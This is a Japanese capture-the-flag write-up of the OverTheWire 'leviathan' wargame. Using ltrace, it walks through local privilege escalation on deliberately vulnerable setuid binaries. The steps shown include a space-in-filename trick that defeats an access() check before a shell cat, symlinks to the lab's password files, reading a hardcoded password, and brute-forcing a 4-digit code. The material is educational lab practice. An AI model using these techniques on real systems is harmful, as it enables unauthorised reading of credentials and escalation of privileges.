# other the wire leviathanに関するメモ

以下のOver The WireというCTFでleviathanというタイプをやった結果のメモを書きます。    

## leviathanとは？  

難易度はeasyでLinux上でのバイナリを調べて権限昇格することを目的としています。  
権限の昇格ができたら、以下に各ユーザのパスワードが存在しますので、これを使って次のユーザを把握します。  
`/etc/leviathan_pass`

## leviathan0

ホーム内にある隠しフォルダ`.backup`を確認することで答えにたどり着きました。
* ~/.backup/bookmarks.html

## leviathan1

trace実行ができるltraceというツールを利用して実行することでわかります。

```sh
./check
ltrace ./check
```

## leviathan2

printfileというexeを調査します。  
ltraceを使うと以下のようになります。  
```sh
leviathan2@leviathan:~$ ltrace ./printfile /tmp/fuga.txt
__libc_start_main(0x804852b, 2, 0xffffd784, 0x8048610 <unfinished ...>
access("/tmp/fuga.txt", 4) = 0
snprintf("/bin/cat /tmp/fuga.txt", 511, "/bin/cat %s", "/tmp/fuga.txt") = 22
geteuid() = 12002
geteuid() = 12002
setreuid(12002, 12002) = 0
system("/bin/cat /tmp/fuga.txt"fuga
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) = 0
+++ exited (status 0) +++
```

このbinは単純にcatコマンドを実行しているようですが、それに合わせて以下のように権限の確認をしています。
```
access("fuga.txt", 4) = 0
```

ここで、権限確認をしたあとのcatコマンドに対してはそのまま渡してしまっていますが、このcatはスペースを挟むことで複数ファイルも許容できます。
cat fileA fileB

これを利用して以下のようなファイルを作ります。
```bash
echo fuga >> pass\ fuga.txt
```
で、以下のように呼び出してます。

```bash
cd /tmp
~/printfile pass\ fuga.txt
```

こうすると、アクセス権限のチェックとcat対象が変わっています。
- チェック対象: "pass fuga.txt"
- cat対象: 以下2ファイル
	- pass
	- fuga.txt

ここまでできれば、このpassを読み取りたいファイルへのシンボリックリンクとして作れば完成です。
```bash
ln -s /etc/leviathan_pass/leviathan3 /tmp/pass
```

## leviathan3

以下のバイナリがあります。  
level3

実行すると以下の結果が得られました。
```bash
Enter the password> bb
bzzzzzzzzap. WRONG
```

ltrace を試してみると以下になっています。  
```bash
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x8048618, 1, 0xffffd794, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka") = -1
printf("Enter the password> ") = 20
fgets(Enter the password> aaa
"aaa\n", 256, 0xf7fc55a0) = 0xffffd5a0
strcmp("aaa\n", "snlprintf\n") = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
) = 19
+++ exited (status 0) +++
```

内容を見ると特定文字(`snlprintf`)との比較を行っていますので、これを入力してみます。そうすると4のユーザとしてシェルをとった状態となります。  

```bash
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$
```

## leviathan4

ホームには残念ながらそれらしいファイルはなかったです。そのため、ゴミ箱内のファイルを確認したところ、`bin`というファイルがありました。

```bash
leviathan4@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root root       4096 Aug 26  2019 .
drwxr-xr-x 10 root root       4096 Aug 26  2019 ..
-rw-r--r--  1 root root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root root        675 May 15  2017 .profile
dr-xr-x---  2 root leviathan4 4096 Aug 26  2019 .trash
leviathan4@leviathan:~$ ls -la .trash/
total 16
dr-xr-x--- 2 root       leviathan4 4096 Aug 26  2019 .
drwxr-xr-x 3 root       root       4096 Aug 26  2019 ..
-r-sr-x--- 1 leviathan5 leviathan4 7352 Aug 26  2019 bin
```

実行して、ltarceも観てみますと、leviathan5のパスワードファイルを見ている模様です。  
```bash
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
leviathan4@leviathan:~/.trash$ ltrace ./bin
__libc_start_main(0x80484bb, 1, 0xffffd774, 0x80485b0 <unfinished ...>
fopen("/etc/leviathan_pass/leviathan5", "r")                                                     = 0
+++ exited (status 255) +++
```

内容からして恐らくビット表記に変えていると思われるため、pythonで文字列に変更します。
```python
values=[0b01010100, 0b01101001, 0b01110100, 0b01101000, 0b00110100, 0b01100011, 0b01101111, 0b01101011, 0b01100101, 0b01101001, 0b00001010]
print "".join([ chr(each) for each in values ])
```

これでパスワードが取得できました。

## leviathan5 

ホームにある以下のバイナリをそのまま＋ltraceで実行してみます。  
```bash
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r") = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)
```

`/tmp/file.log`を開いて表示しているため、このファイル名とパスワードファイルでシンボリックリンクを張ります。  

```bash
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
```

結果として、2進数が返ってくるので、文字列に変更すれば完了です。  

```py
values=[0b01010100, 0b01101001, 0b01110100, 0b01101000, 0b00110100, 0b01100011, 0b01101111, 0b01101011, 0b01100101, 0b01101001, 0b00001010]
"".join([ chr(each) for each in values ])
```

## leviathan6

Homeにある、leviathan6を試してみます。  

```bash
leviathan6@leviathan:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@leviathan:~$ ./leviathan6 1234
Wrong
```

次にltraceしてます。  

```bash
leviathan6@leviathan:~$ ltrace ./leviathan6 1234
__libc_start_main(0x804853b, 2, 0xffffd784, 0x80485e0 <unfinished ...>
atoi(0xffffd8b4, 0, 0xf7e40890, 0x804862b)       = 1234
```

単純に渡した4つの数字が正しければ答えにたどり着くと思えます。トレースの結果から読み取れるかもしれませんが、今回はブルートフォースで行きます。  

```bash
for a in $(seq -w 9999); do ./leviathan6 $a; done
```

少し時間を置くとシェルが取れており、7の権限になっていました。
```bash
$ whoami
leviathan7
```

# これでleviathanは完了です。結構面白いですね！！


